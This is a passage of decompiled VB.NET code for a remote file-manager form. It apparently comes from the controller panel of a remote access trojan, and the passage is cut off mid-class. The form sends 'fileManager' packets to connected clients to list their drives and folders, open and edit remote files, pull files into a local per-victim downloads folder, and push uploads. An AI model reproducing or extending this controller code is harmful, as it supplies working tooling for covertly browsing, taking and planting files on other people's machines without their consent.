		' (set) Token: 0x0600030A RID: 778 RVA: 0x0001982C File Offset: 0x00017A2C
		Friend Overridable Property ManagrLogs As LinkLabel
			<CompilerGenerated()>
			Get
				Return Me._ManagrLogs
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LinkLabel)
				Dim value2 As LinkLabelLinkClickedEventHandler = AddressOf Me.ManagrLogs_LinkClicked
				Dim managrLogs As LinkLabel = Me._ManagrLogs
				If managrLogs IsNot Nothing Then
					RemoveHandler managrLogs.LinkClicked, value2
				End If
				Me._ManagrLogs = value
				managrLogs = Me._ManagrLogs
				If managrLogs IsNot Nothing Then
					AddHandler managrLogs.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x17000150 RID: 336
		' (get) Token: 0x0600030B RID: 779 RVA: 0x0001986F File Offset: 0x00017A6F
		' (set) Token: 0x0600030C RID: 780 RVA: 0x00019879 File Offset: 0x00017A79
		Public Overridable Property imageList1 As ImageList

		' Token: 0x17000151 RID: 337
		' (get) Token: 0x0600030D RID: 781 RVA: 0x00019882 File Offset: 0x00017A82
		' (set) Token: 0x0600030E RID: 782 RVA: 0x0001988C File Offset: 0x00017A8C
		Public Overridable Property FolderLen As Label

		' Token: 0x17000152 RID: 338
		' (get) Token: 0x0600030F RID: 783 RVA: 0x00019895 File Offset: 0x00017A95
		' (set) Token: 0x06000310 RID: 784 RVA: 0x000198A0 File Offset: 0x00017AA0
		Public Overridable Property L1 As ListView
			<CompilerGenerated()>
			Get
				Return Me._L1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim value2 As MouseEventHandler = AddressOf Me.L1_MouseDoubleClick
				Dim l As ListView = Me._L1
				If l IsNot Nothing Then
					RemoveHandler l.MouseDoubleClick, value2
				End If
				Me._L1 = value
				l = Me._L1
				If l IsNot Nothing Then
					AddHandler l.MouseDoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000153 RID: 339
		' (get) Token: 0x06000311 RID: 785 RVA: 0x000198E3 File Offset: 0x00017AE3
		' (set) Token: 0x06000312 RID: 786 RVA: 0x000198ED File Offset: 0x00017AED
		Private Overridable Property ColumnHeader4 As ColumnHeader

		' Token: 0x17000154 RID: 340
		' (get) Token: 0x06000313 RID: 787 RVA: 0x000198F6 File Offset: 0x00017AF6
		' (set) Token: 0x06000314 RID: 788 RVA: 0x00019900 File Offset: 0x00017B00
		Private Overridable Property ColumnHeader5 As ColumnHeader

		' Token: 0x17000155 RID: 341
		' (get) Token: 0x06000315 RID: 789 RVA: 0x00019909 File Offset: 0x00017B09
		' (set) Token: 0x06000316 RID: 790 RVA: 0x00019913 File Offset: 0x00017B13
		Public Overridable Property SelectedItiemsL2 As Label

		' Token: 0x17000156 RID: 342
		' (get) Token: 0x06000317 RID: 791 RVA: 0x0001991C File Offset: 0x00017B1C
		' (set) Token: 0x06000318 RID: 792 RVA: 0x00019928 File Offset: 0x00017B28
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000157 RID: 343
		' (get) Token: 0x06000319 RID: 793 RVA: 0x0001996B File Offset: 0x00017B6B
		' (set) Token: 0x0600031A RID: 794 RVA: 0x00019975 File Offset: 0x00017B75
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer

		' Token: 0x17000158 RID: 344
		' (get) Token: 0x0600031B RID: 795 RVA: 0x0001997E File Offset: 0x00017B7E
		' (set) Token: 0x0600031C RID: 796 RVA: 0x00019988 File Offset: 0x00017B88
		Private Overridable Property TimerClose As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._TimerClose
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.TimerClose_Tick
				Dim timerClose As System.Windows.Forms.Timer = Me._TimerClose
				If timerClose IsNot Nothing Then
					RemoveHandler timerClose.Tick, value2
				End If
				Me._TimerClose = value
				timerClose = Me._TimerClose
				If timerClose IsNot Nothing Then
					AddHandler timerClose.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000159 RID: 345
		' (get) Token: 0x0600031D RID: 797 RVA: 0x000199CB File Offset: 0x00017BCB
		' (set) Token: 0x0600031E RID: 798 RVA: 0x000199D5 File Offset: 0x00017BD5
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700015A RID: 346
		' (get) Token: 0x0600031F RID: 799 RVA: 0x000199DE File Offset: 0x00017BDE
		' (set) Token: 0x06000320 RID: 800 RVA: 0x000199E8 File Offset: 0x00017BE8
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700015B RID: 347
		' (get) Token: 0x06000321 RID: 801 RVA: 0x000199F1 File Offset: 0x00017BF1
		' (set) Token: 0x06000322 RID: 802 RVA: 0x000199FB File Offset: 0x00017BFB
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700015C RID: 348
		' (get) Token: 0x06000323 RID: 803 RVA: 0x00019A04 File Offset: 0x00017C04
		' (set) Token: 0x06000324 RID: 804 RVA: 0x00019A0E File Offset: 0x00017C0E
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x1700015D RID: 349
		' (get) Token: 0x06000325 RID: 805 RVA: 0x00019A17 File Offset: 0x00017C17
		' (set) Token: 0x06000326 RID: 806 RVA: 0x00019A24 File Offset: 0x00017C24
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700015E RID: 350
		' (get) Token: 0x06000327 RID: 807 RVA: 0x00019A67 File Offset: 0x00017C67
		' (set) Token: 0x06000328 RID: 808 RVA: 0x00019A71 File Offset: 0x00017C71
		Public Property Client As Clients

		' Token: 0x1700015F RID: 351
		' (get) Token: 0x06000329 RID: 809 RVA: 0x00019A7A File Offset: 0x00017C7A
		' (set) Token: 0x0600032A RID: 810 RVA: 0x00019A84 File Offset: 0x00017C84
		Public Property F As FormS500

		' Token: 0x17000160 RID: 352
		' (get) Token: 0x0600032B RID: 811 RVA: 0x00019A8D File Offset: 0x00017C8D
		' (set) Token: 0x0600032C RID: 812 RVA: 0x00019A97 File Offset: 0x00017C97
		Public Property FullPath As String

		' Token: 0x17000161 RID: 353
		' (get) Token: 0x0600032D RID: 813 RVA: 0x00019AA0 File Offset: 0x00017CA0
		' (set) Token: 0x0600032E RID: 814 RVA: 0x00019AAA File Offset: 0x00017CAA
		Friend Property ParentClient As Clients

		' Token: 0x0600032F RID: 815 RVA: 0x00019AB4 File Offset: 0x00017CB4
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FileManager_Load
			AddHandler MyBase.Resize, AddressOf Me.FileManager_Resize
			Me.FormSize = False
			Me.IsConnected = False
			Me.InitializeComponent()
			Me.L2.Visible = False
		End Sub

		' Token: 0x06000330 RID: 816
		Public Declare Unicode Function SetWindowTheme Lib "uxtheme" (hWnd As IntPtr, textSubAppName As String, textSubIdList As String) As Integer

		' Token: 0x06000331 RID: 817 RVA: 0x00019B14 File Offset: 0x00017D14
		Private Sub FileManager_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Try
				Me.MinimumSize = MyBase.Size
				FormFileManager.SetWindowTheme(Me.L1.Handle, "explorer", Nothing)
				FormFileManager.SetWindowTheme(Me.L2.Handle, "explorer", Nothing)
				Dim text As String = Path.Combine(Application.StartupPath, "Clients", "Downloads\" + Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2))
				Dim flag As Boolean = Not Directory.Exists(text)
				If flag Then
					Directory.CreateDirectory(text)
					Me.FullPath = text
				Else
					Me.FullPath = text
				End If
			Catch ex2 As Exception
			End Try
			Me.FormSize = True
		End Sub

		' Token: 0x06000332 RID: 818 RVA: 0x00019C9C File Offset: 0x00017E9C
		Private Sub FileManager_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000333 RID: 819 RVA: 0x00019D2D File Offset: 0x00017F2D
		Private Sub ManagrLogs_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Me.ManagrLogs.Text = "..."
		End Sub

		' Token: 0x06000334 RID: 820 RVA: 0x00019D44 File Offset: 0x00017F44
		Private Sub L2_MouseDoubleClick(sender As Object, e As MouseEventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count = 1
				If flag Then
					Dim flag2 As Boolean = Me.L2.SelectedItems(0).ImageIndex <> 0 AndAlso Me.L2.SelectedItems(0).ImageIndex <> 1 AndAlso Me.L2.SelectedItems(0).ImageIndex <> 2
					If flag2 Then
						Try
							Dim flag3 As Boolean = Me.L2.SelectedItems.Count > 0
							If flag3 Then
								Try
									Dim enumerator As IEnumerator = Me.L2.SelectedItems.GetEnumerator()
									While enumerator.MoveNext()
										Dim CS$<>8__locals1 As FormFileManager._Closure$__266-1 = New FormFileManager._Closure$__266-1(CS$<>8__locals1)
										CS$<>8__locals1.$VB$Me = Me
										CS$<>8__locals1.$VB$Local_itm = CType(enumerator.Current, ListViewItem)
										Dim flag4 As Boolean = CS$<>8__locals1.$VB$Local_itm.ImageIndex <> 0 AndAlso CS$<>8__locals1.$VB$Local_itm.ImageIndex <> 1 AndAlso CS$<>8__locals1.$VB$Local_itm.ImageIndex <> 2
										If flag4 Then
											Dim CS$<>8__locals2 As FormFileManager._Closure$__266-0 = New FormFileManager._Closure$__266-0(CS$<>8__locals2)
											CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1
											CS$<>8__locals2.$VB$Local_dwid = Guid.NewGuid().ToString()
											Dim msgPack As MsgPack = New MsgPack()
											msgPack.ForcePathObject("Packet").AsString = "fileManager"
											msgPack.ForcePathObject("Command").AsString = "Editor"
											msgPack.ForcePathObject("Refresh").AsString = Me.TextBox1.Text
											msgPack.ForcePathObject("File").AsString = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.ToolTipText
											msgPack.ForcePathObject("DWID").AsString = CS$<>8__locals2.$VB$Local_dwid
											ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
											MyBase.BeginInvoke(New MethodInvoker(Sub()
												Dim formNote As FormNote = CType(Application.OpenForms("Editor:" + CS$<>8__locals2.$VB$Local_dwid), FormNote)
												Dim flag5 As Boolean = formNote Is Nothing
												If flag5 Then
													formNote = New FormNote() With { .Name = "Editor:" + CS$<>8__locals2.$VB$Local_dwid, .Text = "Editor", .Info = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.ClientInfo.Text, .PathsFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.ToolTipText, .SizeFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.SubItems(3).Text, .TypeFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.SubItems(2).Text, .DateFile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_itm.SubItems(1).Text, .Client = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.Client }
													formNote.Show()
												End If
											End Sub))
										End If
									End While
								Finally
									Dim enumerator As IEnumerator
									If TypeOf enumerator Is IDisposable Then
										TryCast(enumerator, IDisposable).Dispose()
									End If
								End Try
							End If
						Catch ex As Exception
						End Try
					Else
						Dim msgPack2 As MsgPack = New MsgPack()
						msgPack2.ForcePathObject("Packet").AsString = "fileManager"
						msgPack2.ForcePathObject("Command").AsString = "getPath"
						msgPack2.ForcePathObject("Path").AsString = Me.L2.SelectedItems(0).ToolTipText
						Me.L2.Enabled = False
						Me.ManagrLogs.ForeColor = Color.Green
						Me.pr.Value = 30
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
					End If
				End If
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000335 RID: 821 RVA: 0x0001A088 File Offset: 0x00018288
		Private Sub ButtionPC_Click(sender As Object, e As EventArgs)
			Me.TextBox1.Text = String.Empty
			Me.L2.Visible = False
			Me.L1.Visible = True
		End Sub

		' Token: 0x06000336 RID: 822 RVA: 0x0001A0B8 File Offset: 0x000182B8
		Private Sub L1_MouseDoubleClick(sender As Object, e As MouseEventArgs)
			Try
				Dim flag As Boolean = Me.L1.SelectedItems.Count = 1
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "getPath"
					msgPack.ForcePathObject("Path").AsString = Me.L1.SelectedItems(0).ToolTipText
					Me.ManagrLogs.ForeColor = Color.Green
					Me.pr.Value = 30
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.L1.Visible = False
					Me.L2.Visible = True
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000337 RID: 823 RVA: 0x0001A1B4 File Offset: 0x000183B4
		Private Sub MeduamIcons_Click(sender As Object, e As EventArgs)
			Me.L2.View = View.Tile
		End Sub

		' Token: 0x06000338 RID: 824 RVA: 0x0001A1C4 File Offset: 0x000183C4
		Private Sub ListIcons_Click(sender As Object, e As EventArgs)
			Me.L2.View = View.Details
		End Sub

		' Token: 0x06000339 RID: 825 RVA: 0x0001A1D4 File Offset: 0x000183D4
		Private Sub TextBox1_IconLeftClick(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				Dim text As String = Me.TextBox1.Text
				Dim flag As Boolean = text.Length <= 3
				If flag Then
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "getDrivers"
					Me.TextBox1.Text = ""
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Else
					text = text.Remove(text.LastIndexOfAny(New Char() { "\"c }, text.LastIndexOf("\"c)))
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "getPath"
					msgPack.ForcePathObject("Path").AsString = text + "\"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			Catch ex As Exception
				Dim msgPack2 As MsgPack = New MsgPack()
				msgPack2.ForcePathObject("Packet").AsString = "fileManager"
				msgPack2.ForcePathObject("Command").AsString = "getDrivers"
				Me.TextBox1.Text = ""
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
				Me.L2.Visible = False
				Me.L1.Visible = True
			End Try
		End Sub

		' Token: 0x0600033A RID: 826 RVA: 0x0001A394 File Offset: 0x00018594
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Try
				Me.SelectedItiemsL2.Text = Conversions.ToString(Me.L2.SelectedItems.Count) + " items selected"
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600033B RID: 827 RVA: 0x0001A3F0 File Offset: 0x000185F0
		Private Sub Search_TextChanged(sender As Object, e As EventArgs)
			Try
				Me.SearchTextInListView(Me.Search.Text, Me.L2, 0)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600033C RID: 828 RVA: 0x0001A43C File Offset: 0x0001863C
		Public Sub SearchTextInListView(text As String, lstSource As ListView, Optional SubItemsN As Integer = 0)
			Dim CS$<>8__locals1 As FormFileManager._Closure$__274-0 = New FormFileManager._Closure$__274-0(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Local_lstSource = lstSource
			If Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init Is Nothing Then
				Interlocked.CompareExchange(Of StaticLocalInitFlag)(Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init, New StaticLocalInitFlag(), Nothing)
			End If
			Dim flag As Boolean = False
			Try
				Monitor.Enter(Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init, flag)
				If Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init.State = 0S Then
					Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init.State = 2S
					Me.$STATIC$SearchTextInListView$2031E1281E98$unList = New ListView()
				ElseIf Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init.State = 2S Then
					Throw New IncompleteInitialization()
				End If
			Finally
				Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init.State = 1S
				If flag Then
					Monitor.[Exit](Me.$STATIC$SearchTextInListView$2031E1281E98$unList$Init)
				End If
			End Try
			If Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init Is Nothing Then
				Interlocked.CompareExchange(Of StaticLocalInitFlag)(Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init, New StaticLocalInitFlag(), Nothing)
			End If
			Dim flag2 As Boolean = False
			Try
				Monitor.Enter(Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init, flag2)
				If Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init.State = 0S Then
					Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init.State = 2S
					Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch = ""
				ElseIf Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init.State = 2S Then
					Throw New IncompleteInitialization()
				End If
			Finally
				Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init.State = 1S
				If flag2 Then
					Monitor.[Exit](Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch$Init)
				End If
			End Try
			CS$<>8__locals1.$VB$Local_item1 = Nothing
			Dim flag3 As Boolean = Operators.CompareString(Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch, text, False) = 0
			If Not flag3 Then
				Me.$STATIC$SearchTextInListView$2031E1281E98$lastRearch = text
				CS$<>8__locals1.$VB$Local_Index = 0
				While CS$<>8__locals1.$VB$Local_Index < CS$<>8__locals1.$VB$Local_lstSource.Items.Count
					CS$<>8__locals1.$VB$Local_lstSource.Invoke(New VB$AnonymousDelegate_0(Sub()
						CS$<>8__locals1.$VB$Local_item1 = CS$<>8__locals1.$VB$Local_lstSource.Items(CS$<>8__locals1.$VB$Local_Index)
					End Sub))
					Dim flag4 As Boolean = Not CS$<>8__locals1.$VB$Local_item1.SubItems(SubItemsN).Text.ToLower().Contains(text.ToLower())
					If flag4 Then
						CS$<>8__locals1.$VB$Local_Index -= 1
						CS$<>8__locals1.$VB$Local_lstSource.Invoke(New VB$AnonymousDelegate_0(Sub()
							CS$<>8__locals1.$VB$Local_lstSource.BeginUpdate()
							CS$<>8__locals1.$VB$Local_lstSource.Items.Remove(CS$<>8__locals1.$VB$Local_item1)
							CS$<>8__locals1.$VB$Local_lstSource.EndUpdate()
						End Sub))
						Dim flag5 As Boolean = Not Me.$STATIC$SearchTextInListView$2031E1281E98$unList.Items.Contains(CS$<>8__locals1.$VB$Local_item1)
						If flag5 Then
							Me.$STATIC$SearchTextInListView$2031E1281E98$unList.Items.Add(CS$<>8__locals1.$VB$Local_item1)
						End If
					End If
					CS$<>8__locals1.$VB$Local_Index += 1
				End While
				For i As Integer = 0 To Me.$STATIC$SearchTextInListView$2031E1281E98$unList.Items.Count - 1
					CS$<>8__locals1.$VB$Local_cItem = Me.$STATIC$SearchTextInListView$2031E1281E98$unList.Items(i)
					Dim flag6 As Boolean = CS$<>8__locals1.$VB$Local_cItem.SubItems(SubItemsN).Text.ToLower().Contains(text.ToLower())
					If flag6 Then
						i -= 1
						Me.$STATIC$SearchTextInListView$2031E1281E98$unList.Items.Remove(CS$<>8__locals1.$VB$Local_cItem)
						CS$<>8__locals1.$VB$Local_lstSource.Invoke(New VB$AnonymousDelegate_0(Sub()
							CS$<>8__locals1.$VB$Local_lstSource.BeginUpdate()
							CS$<>8__locals1.$VB$Local_lstSource.Items.Add(CS$<>8__locals1.$VB$Local_cItem)
							CS$<>8__locals1.$VB$Local_lstSource.EndUpdate()
						End Sub))
					End If
				Next
			End If
		End Sub

		' Token: 0x0600033D RID: 829 RVA: 0x0001A724 File Offset: 0x00018924
		Private Sub Search_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = e.KeyChar = vbBack
			If flag Then
				Dim num As Integer = Conversions.ToInteger(Me.Search.Text.Length)
				Dim flag2 As Boolean = num = 1
				If flag2 Then
					Try
						Try
							Dim flag3 As Boolean = Operators.CompareString(Me.TextBox1.Text, "", False) <> 0
							If flag3 Then
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileManager"
								msgPack.ForcePathObject("Command").AsString = "getPath"
								msgPack.ForcePathObject("Path").AsString = Me.TextBox1.Text
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							Else
								Dim msgPack2 As MsgPack = New MsgPack()
								msgPack2.ForcePathObject("Packet").AsString = "fileManager"
								msgPack2.ForcePathObject("Command").AsString = "getDrivers"
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
							End If
						Catch ex As Exception
						End Try
					Catch ex2 As Exception
						Debug.WriteLine(ex2.Message)
					End Try
				End If
			End If
		End Sub

		' Token: 0x0600033E RID: 830 RVA: 0x0001A8A0 File Offset: 0x00018AA0
		Private Sub TextBox1_IconRightClick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, "", False) <> 0
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "getPath"
					msgPack.ForcePathObject("Path").AsString = Me.TextBox1.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Else
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "fileManager"
					msgPack2.ForcePathObject("Command").AsString = "getDrivers"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600033F RID: 831 RVA: 0x0001A9AC File Offset: 0x00018BAC
		Private Sub CRefresh_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, "", False) <> 0
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "fileManager"
					msgPack.ForcePathObject("Command").AsString = "getPath"
					msgPack.ForcePathObject("Path").AsString = Me.TextBox1.Text
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Else
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "fileManager"
					msgPack2.ForcePathObject("Command").AsString = "getDrivers"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000340 RID: 832 RVA: 0x0001AAB8 File Offset: 0x00018CB8
		Private Sub CDownload_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim CS$<>8__locals1 As FormFileManager._Closure$__278-0 = New FormFileManager._Closure$__278-0(CS$<>8__locals1)
							CS$<>8__locals1.$VB$Me = Me
							Dim flag2 As Boolean = listViewItem.ImageIndex = 0 AndAlso listViewItem.ImageIndex = 1 AndAlso listViewItem.ImageIndex = 2
							If flag2 Then
								Exit For
							End If
							Dim msgPack As MsgPack = New MsgPack()
							CS$<>8__locals1.$VB$Local_dwid = Guid.NewGuid().ToString()
							msgPack.ForcePathObject("Packet").AsString = "fileManager"
							msgPack.ForcePathObject("Command").AsString = "socketDownload"
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText
							msgPack.ForcePathObject("DWID").AsString = CS$<>8__locals1.$VB$Local_dwid
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							MyBase.BeginInvoke(New MethodInvoker(Sub()
								Dim formDownloadFile As FormDownloadFile = CType(Application.OpenForms("socketDownload:" + CS$<>8__locals1.$VB$Local_dwid), FormDownloadFile)
								Dim flag3 As Boolean = formDownloadFile Is Nothing
								If flag3 Then
									formDownloadFile = New FormDownloadFile() With { .Name = "socketDownload:" + CS$<>8__locals1.$VB$Local_dwid, .Text = "Download", .F = CS$<>8__locals1.$VB$Me.F, .DownloadName = "Download", .Info = CS$<>8__locals1.$VB$Me.ClientInfo.Text, .DirPath = CS$<>8__locals1.$VB$Me.FullPath }
									formDownloadFile.Show()
								End If
							End Sub))
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000341 RID: 833 RVA: 0x0001AC58 File Offset: 0x00018E58
		Private Sub CUpload_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.TextBox1.Text.Length >= 3
			If flag Then
				Try
					Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Multiselect = True }
					Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag2 Then
						For Each text As String In openFileDialog.FileNames
							Dim formDownloadFile As FormDownloadFile = CType(Application.OpenForms("socketDownload:"), FormDownloadFile)
							Dim flag3 As Boolean = formDownloadFile Is Nothing
							If flag3 Then
								formDownloadFile = New FormDownloadFile() With { .Name = "socketUpload:" + Guid.NewGuid().ToString(), .Text = "socketUpload", .F = DataB.form1_0, .Client = Me.Client, .DownloadName = "Upload", .Info = Me.ClientInfo.Text }
								formDownloadFile.FileSize = New FileInfo(text).Length
								formDownloadFile.labelfile.Text = Path.GetFileName(text)
								formDownloadFile.FullFileName = text
								formDownloadFile.ClientFullFileName = Me.TextBox1.Text + "\" + Path.GetFileName(text)
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileManager"
								msgPack.ForcePathObject("Command").AsString = "reqUploadFile"
								msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name
								formDownloadFile.Show()
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
							End If
						Next
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000342 RID: 834 RVA: 0x0001AE58 File Offset: 0x00019058
		Private Sub COpenDownloadFolder_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Directory.Exists(Me.FullPath)
				If flag Then
					Directory.CreateDirectory(Me.FullPath)
					Process.Start(Me.FullPath)
				Else
					Process.Start(Me.FullPath)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000343 RID: 835 RVA: 0x0001AEC4 File Offset: 0x000190C4
		Private Sub TimerClose_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Try
					Dim flag As Boolean = Not Me.Client.TcpClient.Connected
					If flag Then
						MyBase.Close()
					End If
				Catch ex As Exception
					MyBase.Close()
				End Try
			End If
			Try
				Me.SelectedItiemsL2.Text = Conversions.ToString(Me.L2.SelectedItems.Count) + " items selected"
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000344 RID: 836 RVA: 0x0001AF70 File Offset: 0x00019170
		Private Sub CNormal_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
				If flag Then
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
